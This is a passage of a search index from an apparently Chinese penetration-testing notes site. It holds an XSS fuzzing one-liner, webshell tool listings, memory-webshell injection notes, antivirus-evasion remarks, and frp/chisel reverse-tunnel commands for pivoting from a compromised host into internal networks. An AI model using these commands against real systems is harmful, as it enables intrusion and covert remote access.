\u2018\u201d><script>confirm(1)</script>\u2019 | while read host do ; do curl \u2013silent \u2013path-as-is \u2013insecure \u201c$host\u201d | grep -qs \u201c<script>confirm(1)\u201d && echo \u201c$host 33[0;31mVulnerablen\u201d;done","title":"FUZZ xss"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/WebShell/WebShell/","text":"WebShell \u76ee\u5f55 \u54e5\u65af\u62c9 \u51b0\u874e wsmemshell \u5929\u874e \u54e5\u65af\u62c9 https://github.com/BeichenDream/Godzilla \u51b0\u874e https://github.com/rebeyond/Behinder wsmemshell https://github.com/veo/wsMemShell \u6ce8\u5165websocket\u547d\u4ee4\u6267\u884c\u5185\u5b58\u9a6c\uff0c\u7136\u540e\u7528webscoket client\u8fdb\u884c\u8fdc\u63a7\uff08chrome\u6709\u63d2\u4ef6\uff09\u3002 \u5929\u874e","title":"WebShell"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/WebShell/WebShell/#webshell","text":"","title":"WebShell"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/WebShell/WebShell/#_1","text":"\u54e5\u65af\u62c9 \u51b0\u874e wsmemshell \u5929\u874e","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/WebShell/WebShell/#_2","text":"https://github.com/BeichenDream/Godzilla","title":"\u54e5\u65af\u62c9"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/WebShell/WebShell/#_3","text":"https://github.com/rebeyond/Behinder","title":"\u51b0\u874e"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/WebShell/WebShell/#wsmemshell","text":"https://github.com/veo/wsMemShell \u6ce8\u5165websocket\u547d\u4ee4\u6267\u884c\u5185\u5b58\u9a6c\uff0c\u7136\u540e\u7528webscoket client\u8fdb\u884c\u8fdc\u63a7\uff08chrome\u6709\u63d2\u4ef6\uff09\u3002","title":"wsmemshell"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/WebShell/WebShell/#_4","text":"","title":""},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/WebShell/WebShell/#_5","text":"","title":"\u5929\u874e"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BB%A3%E7%90%86/%E4%BB%A3%E7%90%86/","text":"\u4ee3\u7406 \u76ee\u5f55 \u53cd\u5411\u4ee3\u7406 frp\uff08\u4e0d\u9b54\u6539\u88ab\u4e71\u6740\uff09 ssh\u4ee3\u7406\uff08\u9002\u5408\u81ea\u7528\uff09 npc\uff08\u7e41\u7410\uff0c\u4e14\u5bb9\u6613\u88ab\u6740\uff09 chisel iox \u811a\u672c\u4ee3\u7406\uff08\u6b63\u5411\u4ee3\u7406\uff09 suo5 Neo-reGeorg wsmemshell\uff08\u4ec5\u811a\u672c\uff09 pivotnacci \u96a7\u9053 icmp\u96a7\u9053pingtunnel gost \u53cd\u5411\u4ee3\u7406 \u9700\u516c\u7f51IP frp\uff08\u4e0d\u9b54\u6539\u88ab\u4e71\u6740\uff09 frp\uff0c\u786e\u5b9e\u86ee\u597d\u7528\u7684\uff0c\u4ed6\u57fa\u672c\u4e0d\u4f1a\u88ab\u6740\u8f6f\u6740\u6389\u3002\u800c\u4e14\u65e0\u8bba\u662fwin\u5230win\uff0clinux\u5230linux\u8fd8\u662fwin\u5230linux\u7684\u8f6c\u53d1\uff0c\u5b83\u90fd\u652f\u6301\u3002 Download\uff1b https://github.com/fatedier/frp/releases frp\u5206\u4e3a\u6709\u4e24\u4e2a\u4e3b\u8981\u53ef\u6267\u884c\u6587\u4ef6\uff0cfrps\u548cfrpc\uff0c\u5bf9\u5e94\u7684\u914d\u7f6e\u6587\u4ef6\u4e3afrps.ini\u548cfrpc.ini\u3002 \u5176\u4e2dfrps\u7528\u4f5c\u670d\u52a1\u7aef\uff0c\u5728\u8fdb\u884c\u6e17\u900f\u7684\u65f6\u5019\u4e00\u822c\u67b6\u8bbe\u5728\u516c\u7f51VPS\u4e0a\uff0c\u5b83\u7684\u914d\u7f6e\u6587\u4ef6\u9ed8\u8ba4\u4e3a\u8fd9\u6837 [common] bind_port = 10067 #\u76d1\u542c\u7684\u7aef\u53e3 \u8fd0\u884c frps -c frps.ini frpc\u7528\u4f5c\u5ba2\u6237\u7aef\uff0c\u5728\u8fdb\u884c\u6e17\u900f\u7684\u65f6\u5019\u4e00\u822c\u5047\u8bbe\u5728\u5185\u7f51\u673a\u5668\u4e0a\uff0c\u5b83\u7684\u9ed8\u8ba4\u6587\u4ef6\u4e00\u822c\u957f\u8fd9\u6837 [common] server_addr = 149.17.4.190 # \u6307\u5b9a\u9700\u8981\u8f6c\u53d1\u5230\u7684\u516c\u7f51IP server_port = 10067 # \u516c\u7f51VPS\u4e0a\u6240\u76d1\u542c\u7684\u7aef\u53e3 [socks_proxy] # \u6807\u7b7e\u540d\uff0c\u4efb\u610f type = tcp #\u8bbe\u7f6e\u8f6c\u53d1\u7684\u534f\u8bae local_ip=127.0.0.1 #\u586b127.0.0.1\u5c31\u5b8c\u4e8b\u4e86 local_port=3389 #\u9700\u8981\u88ab\u8f6c\u53d1\u7684\u7aef\u53e3 remote_port=10068 #\u8f6c\u53d1\u5230VPS\u4e0a\u7684\u7aef\u53e3 \u8fd0\u884c frpc -c frpc.ini \u5f53\u6211\u4eec\u5728VPS\u4e0a\u8fd0\u884cfrps\uff0c\u5185\u7f51\u673a\u5668\u8fd0\u884cfrpc\u540e\uff0c\u5185\u7f51\u673a\u5668\u76843389\u7aef\u53e3\u5c31\u4f1a\u88ab\u8f6c\u53d1\u5230\u516c\u7f51\u768410068\u7aef\u53e3\u4e0a\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u8fdc\u7a0b\u94fe\u63a5 149.17.4.190:10068 \u5373\u53ef\u8fde\u8fdb\u5185\u7f51\u673a\u5668\u7684\u8fdc\u7a0b\u684c\u9762\u4e86\u3002 \u4e0a\u9762\u662f\u7aef\u53e3\u6620\u5c04\uff0c\u4e0b\u9762\u662f\u76f4\u63a5\u8d70socks5\u4ee3\u7406 \u670d\u52a1\u7aef: [common] bind_addr = 0.0.0.0 bind_port = 7000 # \u7528\u6237\u5bc6\u7801\u4fdd\u5e73\u5b89 dashboard_user = admin1 dashboard_pwd = hadaessd@@@!!@@# # \u5141\u8bb8\u5ba2\u6237\u7aef\u7ed1\u5b9a\u7684\u7aef\u53e3 allow_ports = 40000-50000 \u5ba2\u6237\u7aef [common] #remote vps addr server_addr = your vps addr #\u7aef\u53e3\u81ea\u9009 server_port = 7000 tls_enable = true pool_count = 5 [plugin_socks] type = tcp remote_port = 46075 plugin = socks5 plugin_user = admin plugin_passwd = hahha@@### use_encryption = true use_compression = true ssh\u4ee3\u7406\uff08\u9002\u5408\u81ea\u7528\uff09 \u5728\u672c\u673a\u4e0a\u6267\u884c ssh -N -f -D \u672c\u5730\u7aef\u53e3 \u7528\u6237\u540d@\u8fdc\u7a0b\u670d\u52a1\u5668ip \u7136\u540e\u8f93\u5165\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u6307\u5b9a\u7684\u7528\u6237\u540d\u7684\u5bc6\u7801\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a\u7684\u672c\u5730\u7aef\u53e3\u4ee3\u5165\u8fdc\u7a0b\u670d\u52a1\u5668\u5185\u7f51\u4e86\\~ npc\uff08\u7e41\u7410\uff0c\u4e14\u5bb9\u6613\u88ab\u6740\uff09 \u5bf9\u4e8elinux|darwin sudo nps start \u5bf9\u4e8ewindows\uff0c\u7ba1\u7406\u5458\u8eab\u4efd\u8fd0\u884ccmd\uff0c\u8fdb\u5165\u7a0b\u5e8f\u76ee\u5f55 nps.exe start \u5b89\u88c5\u540ewindows\u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e C:\\Program Files\\nps\uff0clinux\u548cdarwin\u4f4d\u4e8e/etc/nps \u5982\u679c\u53d1\u73b0\u6ca1\u6709\u542f\u52a8\u6210\u529f\uff0c\u53ef\u4ee5\u67e5\u770b\u65e5\u5fd7(Windows\u65e5\u5fd7\u6587\u4ef6\u4f4d\u4e8e\u5f53\u524d\u8fd0\u884c\u76ee\u5f55\u4e0b\uff0clinux\u548cdarwin\u4f4d\u4e8e/var/log/nps.log) \u8bbf\u95ee\u670d\u52a1\u7aefip:web\u670d\u52a1\u7aef\u53e3\uff08\u9ed8\u8ba4\u4e3a8080\uff09 \u4f7f\u7528\u7528\u6237\u540d\u548c\u5bc6\u7801\u767b\u9646\uff08\u9ed8\u8ba4admin/123\uff0c\u6b63\u5f0f\u4f7f\u7528\u4e00\u5b9a\u8981\u66f4\u6539\uff09 \u521b\u5efa\u5ba2\u6237\u7aef \u5ba2\u6237\u7aef\u8fde\u63a5 \u70b9\u51fbweb\u7ba1\u7406\u4e2d\u5ba2\u6237\u7aef\u524d\u7684+\u53f7\uff0c\u590d\u5236\u542f\u52a8\u547d\u4ee4 \u6267\u884c\u542f\u52a8\u547d\u4ee4\uff0clinux\u76f4\u63a5\u6267\u884c\u5373\u53ef\uff0cwindows\u5c06./npc\u6362\u6210npc.exe\u7528cmd\u6267\u884c \u5982\u679c\u9700\u8981\u6ce8\u518c\u5230\u7cfb\u7edf\u670d\u52a1\u53ef\u67e5\u770b \u6ce8\u518c\u5230\u7cfb\u7edf\u670d\u52a1 chisel \u4f7f\u7528\u65b9\u4fbf \uff1a Chisel \u7684\u670d\u52a1\u5668\u7aef\u548c\u5ba2\u6237\u7aef\u96c6\u6210\u5728\u4e00\u5757\uff0c\u8fd9\u5c31\u5f88\u65b9\u4fbf \u9ad8\u6027\u80fd \u4f7f\u7528SSH\u534f\u8bae\u7684\u52a0\u5bc6\u8fde\u63a5\uff08\u901a\u8fc7crypto/ssh\uff09 \u4f46\u662f\uff0c Chisel \u7684\u7f3a\u70b9\u5c31\u662f\uff0c\u5b83\u7684\u6587\u4ef6\u6bd4\u8f83\u5927\u3002\uff08\u4e5f\u4e0d\u662f\u5f88\u5927) vps ./chisel server -p 6666 --reverse ssh -C -f -N -g -L 0.0.0.0:23333:127.0.0.1:1080 root@VPSIP \u5c066666 scoks\u6d41\u91cf\u8f6c\u53d1\u523023333\u7aef\u53e3 \u8089\u9e21 chisel.exe client VPSIP:6666 R:socks \u653b\u51fb\u8005 \u76f4\u63a5\u7528 socks5://vpsip:23333 \u8fdb\u5185\u7f51 iox \u5bb9\u6613\u88ab\u6740\uff0c\u592a\u4e45\u8fdc\u4e86\u3002 1\u3001\u6d41\u91cf\u52a0\u5bc6\uff08\u53ef\u9009\uff09 2\u3001\u53cb\u597d\u7684\u547d\u4ee4\u884c\u53c2\u6570 3\u3001\u903b\u8f91\u4f18\u5316 4\u3001UDP\u6d41\u91cf\u8f6c\u53d1 \u811a\u672c\u4ee3\u7406\uff08\u6b63\u5411\u4ee3\u7406\uff09 \u4e0d\u9700\u8981\u516c\u7f51IP suo5 \u76f8\u6bd4 Neo-reGeorg \u7b49\u4f20\u7edf\u96a7\u9053\u5de5\u5177, suo5 \u7684\u6027\u80fd\u53ef\u4ee5\u8fbe\u5230\u5176\u6570\u5341\u500d\u3002 \u4f46\u662f\u4e0d\u597d\u514d\u6740\u3002 java\u811a\u672c Neo-reGeorg \u6027\u80fd\u4e0d\u5982suo5\u4f46\u662f\u652f\u6301\u591a\u79cd\u8bed\u8a00\uff08ashx\uff0caspx....\uff09 wsmemshell\uff08\u4ec5\u811a\u672c\uff09 https://github.com/veo/wsMemShell websocket\u811a\u672c\uff0c\u4f46\u662f\u53ea\u6709\u811a\u672c\uff0c\u5229\u7528\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u76f4\u63a5\u6ce8\u5165websocket\u4ee3\u7406\u5185\u5b58\u9a6c\uff0c\u7136\u540e\u76f4\u63a5\u8fde\u4e0a\u7528\u4e0a\u5168\u53cc\u5de5\u901a\u4fe1\u534f\u8bae\u7684\u4ee3\u7406\u3002 tomcat\u9ad8\u7248\u672c\u4e2d\uff0c\u9700\u8981\u6539\u4e00\u4e0b\u811a\u672c\u624d\u80fd\u7528\uff1a https://github.com/veo/wsMemShell/issues/18 wsmemshell+gost\u53ef\u4ee5\u8054\u7528 \u540c\u65f6\u8be5\u5de5\u5177\u4e5f\u6709shell\u529f\u80fd\uff0c\u6ce8\u5165websocket\u547d\u4ee4\u6267\u884c\u5185\u5b58\u9a6c\uff0c\u7136\u540e\u7528webscoket client\u8fdb\u884c\u8fdc\u63a7\uff08chrome\u6709\u63d2\u4ef6\uff09\u3002 pivotnacci https://github.com/blackarrowsec/pivotnacci \u652f\u6301php\uff0cjsp\uff0caspx\u3002 \u6539\u826f\u7248regeorg \u96a7\u9053 icmp\u96a7\u9053pingtunnel https://github.com/esrrhs/pingtunnel \u53ef\u4ee5\u5c06\u672c\u5730\u67d0\u7aef\u53e3\u5230\u67d0ip\u67d0\u7aef\u53e3\u4e4b\u95f4\u6570\u636e\u901a\u8fc7icmp\u4f20\u8f93\u3002 localhost:port\u2190icmp\u2192ip:port \u914d\u5408\u5176\u5b83\u4ee3\u7406\u5de5\u5177\uff0c\u5373\u53ef\u5b9e\u73b0icmp\u4ee3\u7406\uff08\u5982iox\uff0cew\u7b49\uff09 \u4ec5\u9760pingtunnel\u662f\u65e0\u6cd5\u5b8c\u6210\u4ee3\u7406\u8fdb\u5185\u7f51\u7684\uff0c\u5b83\u53ea\u662f\u4e00\u4e2a\u6570\u636e\u52a0\u5bc6\u5de5\u5177\u3002 icmp\u96a7\u9053\u9690\u85cf\u6570\u636e\u7684\u5730\u65b9\uff1a gost go\u8bed\u8a00\u5b9e\u73b0\u7684\u5b89\u5168\u96a7\u9053 \u53ef\u7528\u4e8e\u4e0ewsmemshell\u8054\u7528\u3002 \u6bd4\u5982wsmenshell\u6ce8\u5165\u7684\u4ee3\u7406\u5185\u5b58\u9a6c\u5730\u5740\u4e3a http://1.1.1.1:1111/proxy \u90a3\u4e48gost\u5c31\u8f93\u8fd9\u4e2a\u547d\u4ee4 gost -F \"http://1080\" -F \"ws://1.1.1.1:1111?path=/proxy\" socks5\u4ee3\u7406\u7528\u8fd9\u4e2a gost -F \"socks5://1080\" -F \"ws://1.1.1.1:1111?path=/proxy\"","title":"\u4ee3\u7406"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BB%A3%E7%90%86/%E4%BB%A3%E7%90%86/#_1","text":"","title":"\u4ee3\u7406"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BB%A3%E7%90%86/%E4%BB%A3%E7%90%86/#_2","text":"\u53cd\u5411\u4ee3\u7406 frp\uff08\u4e0d\u9b54\u6539\u88ab\u4e71\u6740\uff09 ssh\u4ee3\u7406\uff08\u9002\u5408\u81ea\u7528\uff09 npc\uff08\u7e41\u7410\uff0c\u4e14\u5bb9\u6613\u88ab\u6740\uff09 chisel iox \u811a\u672c\u4ee3\u7406\uff08\u6b63\u5411\u4ee3\u7406\uff09 suo5 Neo-reGeorg wsmemshell\uff08\u4ec5\u811a\u672c\uff09 pivotnacci \u96a7\u9053 icmp\u96a7\u9053pingtunnel gost","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BB%A3%E7%90%86/%E4%BB%A3%E7%90%86/#_3","text":"\u9700\u516c\u7f51IP","title":"\u53cd\u5411\u4ee3\u7406"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BB%A3%E7%90%86/%E4%BB%A3%E7%90%86/#frp","text":"frp\uff0c\u786e\u5b9e\u86ee\u597d\u7528\u7684\uff0c\u4ed6\u57fa\u672c\u4e0d\u4f1a\u88ab\u6740\u8f6f\u6740\u6389\u3002\u800c\u4e14\u65e0\u8bba\u662fwin\u5230win\uff0clinux\u5230linux\u8fd8\u662fwin\u5230linux\u7684\u8f6c\u53d1\uff0c\u5b83\u90fd\u652f\u6301\u3002 Download\uff1b https://github.com/fatedier/frp/releases frp\u5206\u4e3a\u6709\u4e24\u4e2a\u4e3b\u8981\u53ef\u6267\u884c\u6587\u4ef6\uff0cfrps\u548cfrpc\uff0c\u5bf9\u5e94\u7684\u914d\u7f6e\u6587\u4ef6\u4e3afrps.ini\u548cfrpc.ini\u3002 \u5176\u4e2dfrps\u7528\u4f5c\u670d\u52a1\u7aef\uff0c\u5728\u8fdb\u884c\u6e17\u900f\u7684\u65f6\u5019\u4e00\u822c\u67b6\u8bbe\u5728\u516c\u7f51VPS\u4e0a\uff0c\u5b83\u7684\u914d\u7f6e\u6587\u4ef6\u9ed8\u8ba4\u4e3a\u8fd9\u6837 [common] bind_port = 10067 #\u76d1\u542c\u7684\u7aef\u53e3 \u8fd0\u884c frps -c frps.ini frpc\u7528\u4f5c\u5ba2\u6237\u7aef\uff0c\u5728\u8fdb\u884c\u6e17\u900f\u7684\u65f6\u5019\u4e00\u822c\u5047\u8bbe\u5728\u5185\u7f51\u673a\u5668\u4e0a\uff0c\u5b83\u7684\u9ed8\u8ba4\u6587\u4ef6\u4e00\u822c\u957f\u8fd9\u6837 [common] server_addr = 149.17.4.190 # \u6307\u5b9a\u9700\u8981\u8f6c\u53d1\u5230\u7684\u516c\u7f51IP server_port = 10067 # \u516c\u7f51VPS\u4e0a\u6240\u76d1\u542c\u7684\u7aef\u53e3 [socks_proxy] # \u6807\u7b7e\u540d\uff0c\u4efb\u610f type = tcp #\u8bbe\u7f6e\u8f6c\u53d1\u7684\u534f\u8bae local_ip=127.0.0.1 #\u586b127.0.0.1\u5c31\u5b8c\u4e8b\u4e86 local_port=3389 #\u9700\u8981\u88ab\u8f6c\u53d1\u7684\u7aef\u53e3 remote_port=10068 #\u8f6c\u53d1\u5230VPS\u4e0a\u7684\u7aef\u53e3 \u8fd0\u884c frpc -c frpc.ini \u5f53\u6211\u4eec\u5728VPS\u4e0a\u8fd0\u884cfrps\uff0c\u5185\u7f51\u673a\u5668\u8fd0\u884cfrpc\u540e\uff0c\u5185\u7f51\u673a\u5668\u76843389\u7aef\u53e3\u5c31\u4f1a\u88ab\u8f6c\u53d1\u5230\u516c\u7f51\u768410068\u7aef\u53e3\u4e0a\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u8fdc\u7a0b\u94fe\u63a5 149.17.4.190:10068 \u5373\u53ef\u8fde\u8fdb\u5185\u7f51\u673a\u5668\u7684\u8fdc\u7a0b\u684c\u9762\u4e86\u3002 \u4e0a\u9762\u662f\u7aef\u53e3\u6620\u5c04\uff0c\u4e0b\u9762\u662f\u76f4\u63a5\u8d70socks5\u4ee3\u7406 \u670d\u52a1\u7aef: [common] bind_addr = 0.0.0.0 bind_port = 7000 # \u7528\u6237\u5bc6\u7801\u4fdd\u5e73\u5b89 dashboard_user = admin1 dashboard_pwd = hadaessd@@@!!@@# # \u5141\u8bb8\u5ba2\u6237\u7aef\u7ed1\u5b9a\u7684\u7aef\u53e3 allow_ports = 40000-50000 \u5ba2\u6237\u7aef [common] #remote vps addr server_addr = your vps addr #\u7aef\u53e3\u81ea\u9009 server_port = 7000 tls_enable = true pool_count = 5 [plugin_socks] type = tcp remote_port = 46075 plugin = socks5 plugin_user = admin plugin_passwd = hahha@@### use_encryption = true use_compression = true","title":"frp\uff08\u4e0d\u9b54\u6539\u88ab\u4e71\u6740\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BB%A3%E7%90%86/%E4%BB%A3%E7%90%86/#ssh","text":"\u5728\u672c\u673a\u4e0a\u6267\u884c ssh -N -f -D \u672c\u5730\u7aef\u53e3 \u7528\u6237\u540d@\u8fdc\u7a0b\u670d\u52a1\u5668ip \u7136\u540e\u8f93\u5165\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u6307\u5b9a\u7684\u7528\u6237\u540d\u7684\u5bc6\u7801\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a\u7684\u672c\u5730\u7aef\u53e3\u4ee3\u5165\u8fdc\u7a0b\u670d\u52a1\u5668\u5185\u7f51\u4e86\\~","title":"ssh\u4ee3\u7406\uff08\u9002\u5408\u81ea\u7528\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BB%A3%E7%90%86/%E4%BB%A3%E7%90%86/#npc","text":"\u5bf9\u4e8elinux|darwin sudo nps start \u5bf9\u4e8ewindows\uff0c\u7ba1\u7406\u5458\u8eab\u4efd\u8fd0\u884ccmd\uff0c\u8fdb\u5165\u7a0b\u5e8f\u76ee\u5f55 nps.exe start \u5b89\u88c5\u540ewindows\u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e C:\\Program Files\\nps\uff0clinux\u548cdarwin\u4f4d\u4e8e/etc/nps \u5982\u679c\u53d1\u73b0\u6ca1\u6709\u542f\u52a8\u6210\u529f\uff0c\u53ef\u4ee5\u67e5\u770b\u65e5\u5fd7(Windows\u65e5\u5fd7\u6587\u4ef6\u4f4d\u4e8e\u5f53\u524d\u8fd0\u884c\u76ee\u5f55\u4e0b\uff0clinux\u548cdarwin\u4f4d\u4e8e/var/log/nps.log) \u8bbf\u95ee\u670d\u52a1\u7aefip:web\u670d\u52a1\u7aef\u53e3\uff08\u9ed8\u8ba4\u4e3a8080\uff09 \u4f7f\u7528\u7528\u6237\u540d\u548c\u5bc6\u7801\u767b\u9646\uff08\u9ed8\u8ba4admin/123\uff0c\u6b63\u5f0f\u4f7f\u7528\u4e00\u5b9a\u8981\u66f4\u6539\uff09 \u521b\u5efa\u5ba2\u6237\u7aef \u5ba2\u6237\u7aef\u8fde\u63a5 \u70b9\u51fbweb\u7ba1\u7406\u4e2d\u5ba2\u6237\u7aef\u524d\u7684+\u53f7\uff0c\u590d\u5236\u542f\u52a8\u547d\u4ee4 \u6267\u884c\u542f\u52a8\u547d\u4ee4\uff0clinux\u76f4\u63a5\u6267\u884c\u5373\u53ef\uff0cwindows\u5c06./npc\u6362\u6210npc.exe\u7528cmd\u6267\u884c \u5982\u679c\u9700\u8981\u6ce8\u518c\u5230\u7cfb\u7edf\u670d\u52a1\u53ef\u67e5\u770b \u6ce8\u518c\u5230\u7cfb\u7edf\u670d\u52a1","title":"npc\uff08\u7e41\u7410\uff0c\u4e14\u5bb9\u6613\u88ab\u6740\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BB%A3%E7%90%86/%E4%BB%A3%E7%90%86/#chisel","text":"\u4f7f\u7528\u65b9\u4fbf \uff1a Chisel \u7684\u670d\u52a1\u5668\u7aef\u548c\u5ba2\u6237\u7aef\u96c6\u6210\u5728\u4e00\u5757\uff0c\u8fd9\u5c31\u5f88\u65b9\u4fbf \u9ad8\u6027\u80fd \u4f7f\u7528SSH\u534f\u8bae\u7684\u52a0\u5bc6\u8fde\u63a5\uff08\u901a\u8fc7crypto/ssh\uff09 \u4f46\u662f\uff0c Chisel \u7684\u7f3a\u70b9\u5c31\u662f\uff0c\u5b83\u7684\u6587\u4ef6\u6bd4\u8f83\u5927\u3002\uff08\u4e5f\u4e0d\u662f\u5f88\u5927) vps ./chisel server -p 6666 --reverse ssh -C -f -N -g -L 0.0.0.0:23333:127.0.0.1:1080 root@VPSIP \u5c066666 scoks\u6d41\u91cf\u8f6c\u53d1\u523023333\u7aef\u53e3 \u8089\u9e21 chisel.exe client VPSIP:6666 R:socks \u653b\u51fb\u8005 \u76f4\u63a5\u7528 socks5://vpsip:23333 \u8fdb\u5185\u7f51","title":"chisel"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BB%A3%E7%90%86/%E4%BB%A3%E7%90%86/#iox","text":"\u5bb9\u6613\u88ab\u6740\uff0c\u592a\u4e45\u8fdc\u4e86\u3002 1\u3001\u6d41\u91cf\u52a0\u5bc6\uff08\u53ef\u9009\uff09 2\u3001\u53cb\u597d\u7684\u547d\u4ee4\u884c\u53c2\u6570 3\u3001\u903b\u8f91\u4f18\u5316 4\u3001UDP\u6d41\u91cf\u8f6c\u53d1","title":"iox"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BB%A3%E7%90%86/%E4%BB%A3%E7%90%86/#_4","text":"\u4e0d\u9700\u8981\u516c\u7f51IP","title":"\u811a\u672c\u4ee3\u7406\uff08\u6b63\u5411\u4ee3\u7406\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BB%A3%E7%90%86/%E4%BB%A3%E7%90%86/#suo5","text":"\u76f8\u6bd4 Neo-reGeorg \u7b49\u4f20\u7edf\u96a7\u9053\u5de5\u5177, suo5 \u7684\u6027\u80fd\u53ef\u4ee5\u8fbe\u5230\u5176\u6570\u5341\u500d\u3002 \u4f46\u662f\u4e0d\u597d\u514d\u6740\u3002 java\u811a\u672c","title":"suo5"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BB%A3%E7%90%86/%E4%BB%A3%E7%90%86/#neo-regeorg","text":"\u6027\u80fd\u4e0d\u5982suo5\u4f46\u662f\u652f\u6301\u591a\u79cd\u8bed\u8a00\uff08ashx\uff0caspx....\uff09","title":"Neo-reGeorg"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BB%A3%E7%90%86/%E4%BB%A3%E7%90%86/#wsmemshell","text":"https://github.com/veo/wsMemShell websocket\u811a\u672c\uff0c\u4f46\u662f\u53ea\u6709\u811a\u672c\uff0c\u5229\u7528\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u76f4\u63a5\u6ce8\u5165websocket\u4ee3\u7406\u5185\u5b58\u9a6c\uff0c\u7136\u540e\u76f4\u63a5\u8fde\u4e0a\u7528\u4e0a\u5168\u53cc\u5de5\u901a\u4fe1\u534f\u8bae\u7684\u4ee3\u7406\u3002 tomcat\u9ad8\u7248\u672c\u4e2d\uff0c\u9700\u8981\u6539\u4e00\u4e0b\u811a\u672c\u624d\u80fd\u7528\uff1a https://github.com/veo/wsMemShell/issues/18 wsmemshell+gost\u53ef\u4ee5\u8054\u7528 \u540c\u65f6\u8be5\u5de5\u5177\u4e5f\u6709shell\u529f\u80fd\uff0c\u6ce8\u5165websocket\u547d\u4ee4\u6267\u884c\u5185\u5b58\u9a6c\uff0c\u7136\u540e\u7528webscoket client\u8fdb\u884c\u8fdc\u63a7\uff08chrome\u6709\u63d2\u4ef6\uff09\u3002","title":"wsmemshell\uff08\u4ec5\u811a\u672c\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BB%A3%E7%90%86/%E4%BB%A3%E7%90%86/#pivotnacci","text":"https://github.com/blackarrowsec/pivotnacci \u652f\u6301php\uff0cjsp\uff0caspx\u3002 